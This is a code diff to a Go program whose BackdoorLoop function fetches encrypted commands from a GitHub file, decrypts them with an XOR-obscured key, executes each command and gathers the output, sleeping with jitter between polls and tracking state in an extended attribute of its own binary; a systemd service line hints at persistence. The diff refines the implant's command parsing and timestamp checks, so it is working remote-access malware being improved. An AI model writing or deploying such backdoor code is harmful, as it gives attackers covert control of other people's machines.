@@ -82,8 +82,6 @@ WantedBy=multi-user.target
 func BackdoorLoop() {
 	key := string(encryption.XORTransform(scrambledKey, xorKey))
 	for {
-		lastCommandTime := GetLastCommandTime()
-
 		commandEncrypted, err := github.ReadFile("commands.txt")
 		if err != nil {
 			fmt.Println("Error fetching command file:", err)
@@ -96,26 +94,26 @@ func BackdoorLoop() {
 			return
 		}
 
-		data := strings.Split(commandUnencrypted, "|")
-		if len(data) != 2 {
+		timestampStr, after, found := strings.Cut(commandUnencrypted, "|")
+		if !found {
 			fmt.Println("Invalid command format")
 			return
 		}
 
-		timestampStr := data[0]
 		timestamp, err := strconv.ParseInt(timestampStr, 10, 64)
 		if err != nil {
 			fmt.Println("Error parsing timestamp:", err)
 			return
 		}
 
-		if timestamp == lastCommandTime {
+		lastCommandTime := GetLastCommandTime()
+		if timestamp <= lastCommandTime {
 			// no new command, sleep and check again later
 			SleepWithJitter()
 			continue
 		}
 
-		commands := strings.Split(data[1], "\n")
+		commands := strings.Split(after, "\n")
 		outputs := make([]string, 0, len(commands))
 
 		// run each command and store the output
@@ -173,16 +171,15 @@ func GetLastCommandTime() int64 {
 		return 0
 	}
 
-	// sz is the exact number of bytes returned. We slice the buffer to that size.
 	savedTime, err := strconv.ParseInt(string(dest[:sz]), 10, 64)
 	if err != nil {
-		return 0 // Return 0 if the data got corrupted
+		return 0 // if the data got corrupted
 	}
 
 	return savedTime
 }
 
-// writes last command time to the xaddr attribute of the binary
+// writes last command time to the xaddr attribute of the binary. this is the only "state" management we need
 func SetLastCommandTime(timestamp int64) {
 	timeStr := strconv.FormatInt(timestamp, 10)
 	unix.Setxattr(targetPath, "user.last_command_time", []byte(timeStr), 0)
